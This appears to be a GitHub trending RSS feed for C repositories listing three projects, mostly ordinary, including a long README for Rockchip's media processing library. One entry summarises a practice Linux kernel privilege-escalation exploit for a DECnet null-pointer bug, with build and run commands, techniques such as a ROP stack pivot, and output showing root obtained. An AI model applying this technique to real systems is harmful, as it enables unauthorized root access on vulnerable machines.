<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-07-02T01:32:26Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>alx-tools/make_magic_happen</title>
    <updated>2023-07-02T01:32:26Z</updated>
    <id>tag:github.com,2023-07-02:/alx-tools/make_magic_happen</id>
    <link href="https://github.com/alx-tools/make_magic_happen" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Make Magic Happen&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;make_magic_happen&lt;/h1&gt; &#xA;&lt;p&gt;Make Magic Happen&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>TurtleARM/CVE-2023-3338</title>
    <updated>2023-07-02T01:32:26Z</updated>
    <id>tag:github.com,2023-07-02:/TurtleARM/CVE-2023-3338</id>
    <link href="https://github.com/TurtleARM/CVE-2023-3338" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Linux kernel LPE practice with an NPD vulnerability&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2023-3338&lt;/h1&gt; &#xA;&lt;p&gt;Practicing different Linux kernel exploitation techniques with my DECnet vulnerability and null page mapping enabled.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Scenarios&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Everything disabled: &lt;code&gt;qemu-system-x86_64 -append &#34;nosmap nosmep nopti nokaslr&#34;&lt;/code&gt;&lt;/p&gt; &lt;p&gt;Code execution is redirected to the &lt;code&gt;output&lt;/code&gt; function in userland, which invokes &lt;code&gt;commit_creds(prepare_kernel_cred(0))&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;SMEP and KPTI enabled: &lt;code&gt;qemu-system-x86_64 -append &#34;nosmap nokaslr&#34;&lt;/code&gt;&lt;/p&gt; &lt;p&gt;Code execution is redirected to a stack pivot that sets &lt;em&gt;$rsp&lt;/em&gt; to a ROP chain in the null page.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Build&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;apt install libdnet&#xA;gcc -o lpe lpe.c -ldnet&#xA;gcc -o lpe-nosmep lpe-nosmep.c -ldnet -no-pie&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Run&lt;/h2&gt; &#xA;&lt;p&gt;Configure DECnet as root:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sysctl -w vm.mmap_min_addr=&#34;0&#34; # 0x1000&#xA;echo -n &#34;1.10&#34; &amp;gt; /proc/sys/net/decnet/node_address&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Run the exploit as unprivileged user:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./lpe&#xA;[*] Saved state&#xA;[*] Triggering NPD&#xA;[*] Returned to userland&#xA;[*] UID: 0, got root!&#xA;#&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>rockchip-linux/mpp</title>
    <updated>2023-07-02T01:32:26Z</updated>
    <id>tag:github.com,2023-07-02:/rockchip-linux/mpp</id>
    <link href="https://github.com/rockchip-linux/mpp" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Media Process Platform (MPP) module&lt;/p&gt;&lt;hr&gt;&lt;p&gt;Media Process Platform (MPP) module directory description:&lt;/p&gt; &#xA;&lt;p&gt;MPP : Media Process Platform MPI : Media Process Interface HAL : Hardware Abstract Layer OSAL : Operation System Abstract Layer&lt;/p&gt; &#xA;&lt;p&gt;Rules:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;header file arrange rule a. inc directory in each module folder is for external module usage. b. module internal header file should be put along with the implement file. c. header file should not contain any relative path or absolute path, all include path should be keep in Makefile.&lt;/li&gt; &#xA; &lt;li&gt;compiling system rule a. for cross platform compiling use cmake as the compiling management system. b. use cmake out-of-source build, final binary and library will be install to out/ directory.&lt;/li&gt; &#xA; &lt;li&gt;header file include order a. MODULE_TAG b. system header c. osal header d. module header&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;NOTE:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Windows support is NOT maintained any more.&lt;/li&gt; &#xA; &lt;li&gt;Mpp support all rockchip chipset now including: RK29XX/RK30XX/RK31XX RK3288/RK3368/RK3399 RK3228/RK3229/RK3228H/RK3328 RK3566/RK3568 RK3588 RV1108/RV1107 RV1109/RV1126&lt;/li&gt; &#xA; &lt;li&gt;Mpp support all format hardware can support except VC1.&lt;/li&gt; &#xA; &lt;li&gt;you can get demo about mpp applied to linux and android. Liunx : &lt;a href=&#34;https://github.com/WainDing/mpp_linux_cpp&#34;&gt;https://github.com/WainDing/mpp_linux_cpp&lt;/a&gt; &lt;a href=&#34;https://github.com/MUZLATAN/ffmpeg_rtsp_mpp&#34;&gt;https://github.com/MUZLATAN/ffmpeg_rtsp_mpp&lt;/a&gt; Android : &lt;a href=&#34;https://github.com/c-xh/RKMediaCodecDemo&#34;&gt;https://github.com/c-xh/RKMediaCodecDemo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;offical github: &lt;a href=&#34;https://github.com/rockchip-linux/mpp&#34;&gt;https://github.com/rockchip-linux/mpp&lt;/a&gt; develop github: &lt;a href=&#34;https://github.com/HermanChen/mpp&#34;&gt;https://github.com/HermanChen/mpp&lt;/a&gt; develop gitee : &lt;a href=&#34;https://gitee.com/hermanchen82/mpp&#34;&gt;https://gitee.com/hermanchen82/mpp&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;More document can be found at &lt;a href=&#34;http://opensource.rock-chips.com/wiki_Mpp&#34;&gt;http://opensource.rock-chips.com/wiki_Mpp&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;---- top | |----- build CMake out-of-source build directory | | | |----- cmake cmake script directory | | | |----- android android build directory | | | |----- linux linux build directory | | | |----- vc10-x86_64 visual studio 2010 on x86_64 build directory | | | |----- vc12-x86_64 visual studio 2013 on x86_64 build directory | |----- doc design documents of mpp | |----- inc header file for external usage, including | platform header and mpi header | |----- mpp Media Process Platform : mpi function private | | implement and mpp infrastructure (vpu_api | | private layer) | | | |----- base base components including MppBuffer, MppFrame, | | MppPacket, MppTask, MppMeta, etc. | | | |----- common video codec protocol syntax interface for both | | codec parser and hal | | | |----- codec all video codec parser, convert stream to | | | protocol structure | | | | | |----- inc header files provided by codec module for | | | external usage | | | | | |----- dec | | | | | | | |----- dummy decoder parser work flow sample | | | | | | | |----- h263 | | | | | | | |----- h264 | | | | | | | |----- h265 | | | | | | | |----- m2v mpeg2 parser | | | | | | | |----- mpg4 mpeg4 parser | | | | | | | |----- vp8 | | | | | | | |----- vp9 | | | | | | | |----- jpeg | | | | | |----- enc | | | | | |----- dummy encoder controllor work flow sample | | | | | |----- h264 | | | | | |----- h265 | | | | | |----- jpeg | | | |----- hal Hardware Abstract Layer (HAL): modules used in mpi | | | | | |----- inc header files provided by hal for external usage | | | | | |----- iep iep user library | | | | | |----- pp post-processor user library | | | | | |----- rga rga user library | | | | | |----- deinter deinterlace function module including pp/iep/rga | | | | | |----- rkdec rockchip hardware decoder register generation | | | | | | | |----- h264d generate register file from H.264 syntax info | | | | | | | |----- h265d generate register file from H.265 syntax info | | | | | | | |----- vp9d generate register file from vp9 syntax info | | | | | |----- vpu vpu register generation library | | | | | |----- h263d generate register file from H.263 syntax info | | | | | |----- h264d generate register file from H.264 syntax info | | | | | |----- h265d generate register file from H.265 syntax info | | | | | |----- jpegd generate register file from jpeg syntax info | | | | | |----- jpege generate register file from jpeg syntax info | | | | | |----- m2vd generate register file from mpeg2 syntax info | | | | | |----- mpg4d generate register file from mpeg4 syntax info | | | | | |----- vp8d generate register file from vp8 syntax info | | | |----- legacy generate new libvpu to include old vpuapi path | | and new mpp path | | | |----- test mpp internal video protocol unit test and demo | |----- test mpp buffer/packet component unit test and | mpp/mpi/vpu_api demo | |----- out final release binary output directory | | | |----- bin executable binary file output directory | | | |----- inc header file output directory | | | |----- lib library file output directory | |----- osal Operation System Abstract Layer: abstract layer | | for different operation system | | | |----- allocator supported allocator including Android ion and | | Linux drm | | | |----- android google&#39;s android | | | |----- inc osal header file for mpp modules | | | |----- linux mainline linux kernel | | | |----- windows microsoft&#39;s windows | | | |----- test OASL unit test | |----- tools coding style format tools | |----- utils small util functions&lt;/p&gt; &#xA;&lt;p&gt;Here is the mpp implement overall framework:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;            +---------------------------------------+&#xA;            |                                       |&#xA;            | ffmpeg / OpenMax / gstreamer / libva  |&#xA;            |                                       |&#xA;            +---------------------------------------+&#xA;&#xA;        +-------------------- MPP ----------------------+&#xA;        |                                               |&#xA;        |   +-------------------------+    +--------+   |&#xA;        |   |                         |    |        |   |&#xA;        |   |        MPI / MPP        |    |        |   |&#xA;        |   |   buffer queue manage   |    |        |   |&#xA;        |   |                         |    |        |   |&#xA;        |   +-------------------------+    |        |   |&#xA;        |                                  |        |   |&#xA;        |   +-------------------------+    |        |   |&#xA;        |   |                         |    |        |   |&#xA;        |   |          codec          |    |  OSAL  |   |&#xA;        |   |    decoder / encoder    |    |        |   |&#xA;        |   |                         |    |        |   |&#xA;        |   +-------------------------+    |        |   |&#xA;        |                                  |        |   |&#xA;        |   +-----------+ +-----------+    |        |   |&#xA;        |   |           | |           |    |        |   |&#xA;        |   |  parser   | |    HAL    |    |        |   |&#xA;        |   |  recoder  | |  reg_gen  |    |        |   |&#xA;        |   |           | |           |    |        |   |&#xA;        |   +-----------+ +-----------+    +--------|   |&#xA;        |                                               |&#xA;        +-------------------- MPP ----------------------+&#xA;&#xA;            +---------------------------------------+&#xA;            |                                       |&#xA;            |                kernel                 |&#xA;            |       RK vcodec_service / v4l2        |&#xA;            |                                       |&#xA;            +---------------------------------------+&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Here is the Media Process Interface hierarchical structure MpiPacket and MpiFrame is the stream I/O data structure. And MpiBuffer encapsulates different buffer implement like Linux&#39;s dma-buf and Android&#39;s ion. This part is learned from ffmpeg.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;            +-------------------+&#xA;            |                   |&#xA;            |        MPI        |&#xA;            |                   |&#xA;            +---------+---------+&#xA;                      |&#xA;                      |&#xA;                      v&#xA;            +---------+---------+&#xA;            |                   |&#xA;        +---+        ctx        +---+&#xA;        |   |                   |   |&#xA;        |   +-------------------+   |&#xA;        |                           |&#xA;        v                           v&#xA;+-------+-------+           +-------+-------+&#xA;|               |           |               |&#xA;|     packet    |           |     frame     |&#xA;|               |           |               |&#xA;+---------------+           +-------+-------+&#xA;        |                           |&#xA;        |                           |&#xA;        |                           |&#xA;        |     +---------------+     |&#xA;        |     |               |     |&#xA;        +----&amp;gt;+     buffer    +&amp;lt;----+&#xA;              |               |&#xA;              +---------------+&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Take H.264 deocder for example. Video stream will first queued by MPI/MPP layer, MPP will send the stream to codec layer, codec layer parses the stream header and generates a protocol standard output. This output will be send to HAL to generate register file set and communicate with hardware. Hardware will complete the task and resend information back. MPP notify codec by hardware result, codec output decoded frame by display order.&lt;/p&gt; &#xA;&lt;p&gt;MPI MPP decoder parser HAL&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;pre&gt;&lt;code&gt;             +                  +                  +                  +&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;| | | | | | open context | | | | +----------------&amp;gt; | | | | | | | | | | init | | | | +----------------&amp;gt; | | | | | | | | | | | init | | | | +----------------&amp;gt; | | | | | | | | | | | init | | | | +----------------&amp;gt; | | | | | | | | | | | open | | | +-----------------------------------&amp;gt; | | | | | | | decode | | | | +----------------&amp;gt; | | | | | | | | | | | send_stream | | | | +----------------&amp;gt; | | | | | | | | | | | parse_stream | | | | +----------------&amp;gt; | | | | | | | | | | | reg generation | | | +-----------------------------------&amp;gt; | | | | | | | | | | send_regs | | | +-----------------------------------&amp;gt; | | | | | | | | | | wait_regs | | | +-----------------------------------&amp;gt; | | | | | | | | | notify_hw_end | | | | +----------------&amp;gt; | | | | | | | | | get_picture | | | | +----------------&amp;gt; | | | | | | | | | | | get_picture | | | | +----------------&amp;gt; | | | | | | | | flush | | | | +----------------&amp;gt; | | | | | | | | | | | flush | | | | +----------------&amp;gt; | | | | | | | | | | | reset | | | | +----------------&amp;gt; | | | | | | | | close | | | | +----------------&amp;gt; | | | | | | | | | | | close | | | | +----------------&amp;gt; | | | | | | | | | | | close | | | | +----------------&amp;gt; | | | | | | | | | | | close | | | +-----------------------------------&amp;gt; |&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;pre&gt;&lt;code&gt;             +                  +                  +                  +&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;There are three memory usage modes that decoder can support:&lt;/p&gt; &#xA;&lt;p&gt;Mode 1: Pure internal mode In the mode user will NOT call MPP_DEC_SET_EXT_BUF_GROUP control to decoder. Only call MPP_DEC_SET_INFO_CHANGE_READY to let decoder go on. Then decoder will use create buffer internally and user need to release each frame they get.&lt;/p&gt; &#xA;&lt;p&gt;Advantage: Easy to use and get a demo quickly Disadvantage:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;The buffer from decoder may not be return before decoder is close. So memory leak or crash may happen.&lt;/li&gt; &#xA; &lt;li&gt;The decoder memory usage can not be control. Decoder is on a free-to-run status and consume all memory it can get.&lt;/li&gt; &#xA; &lt;li&gt;Difficult to implement zero-copy display path.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Mode 2: Half internal mode This is the mode current mpi_dec_test code using. User need to create MppBufferGroup according to the returned info change MppFrame. User can use mpp_buffer_group_limit_config to limit decoder memory usage.&lt;/p&gt; &#xA;&lt;p&gt;Advantage:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Easy to use&lt;/li&gt; &#xA; &lt;li&gt;User can release MppBufferGroup after decoder is closed. So memory can stay longer safely.&lt;/li&gt; &#xA; &lt;li&gt;Can limit the memory usage by mpp_buffer_group_limit_config Disadvantage:&lt;/li&gt; &#xA; &lt;li&gt;The buffer limitation is still not accurate. Memory usage is 100% fixed.&lt;/li&gt; &#xA; &lt;li&gt;Also difficult to implement zero-copy display path.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Mode 3: Pure external mode In this mode use need to create empty MppBufferGroup and import memory from external allocator by file handle. On Android surfaceflinger will create buffer. Then mediaserver get file handle from surfaceflinger and commit to decoder&#39;s MppBufferGroup.&lt;/p&gt; &#xA;&lt;p&gt;Advantage:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Most efficient way for zero-copy display Disadvantage:&lt;/li&gt; &#xA; &lt;li&gt;Difficult to learn and use.&lt;/li&gt; &#xA; &lt;li&gt;Player work flow may limit this usage.&lt;/li&gt; &#xA; &lt;li&gt;May need external parser to get the correct buffer size for the external allocator.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;The required buffer size caculation: hor_stride * ver_stride * 3 / 2 for pixel data hor_stride * ver_stride / 2 for extra info Total hor_stride * ver_stride * 2 will be enough.&lt;/p&gt; &#xA;&lt;p&gt;For H.264/H.265 20+ buffers will be enough. For other codec 10 buffers will be enough.&lt;/p&gt;</summary>
  </entry>
</feed>